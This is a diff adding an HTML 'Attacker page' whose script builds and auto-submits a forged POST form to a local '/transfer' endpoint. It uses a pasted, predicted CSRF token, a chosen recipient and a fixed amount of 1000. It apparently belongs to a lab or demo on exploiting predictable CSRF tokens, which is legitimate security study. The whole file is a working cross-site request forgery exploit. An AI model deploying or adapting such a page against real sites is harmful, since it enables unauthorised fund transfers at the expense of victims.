@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Attacker</title>
+</head>
+
+<body>
+    <h1>Attacker page</h1>
+    <p>Paste predicted token below and click to send forged transfer.</p>
+    <input id="token" placeholder="predicted_csrf_token">
+    <input id="to" placeholder="victim_username (e.g., alice)">
+    <button onclick="exploit()">Exploit</button>
+
+    <script>
+        function exploit() {
+            const t = document.getElementById('token').value;
+            const to = document.getElementById('to').value;
+            const f = document.createElement('form');
+            f.method = 'POST';
+            f.action = 'http://localhost:5000/transfer';
+            const i1 = document.createElement('input'); i1.name = 'csrf_token'; i1.value = t; f.appendChild(i1);
+            const i2 = document.createElement('input'); i2.name = 'to'; i2.value = to; f.appendChild(i2);
+            const i3 = document.createElement('input'); i3.name = 'amount'; i3.value = '1000'; f.appendChild(i3);
+            document.body.appendChild(f);
+            f.submit();
+        }
+    </script>
+</body>
+
+</html>
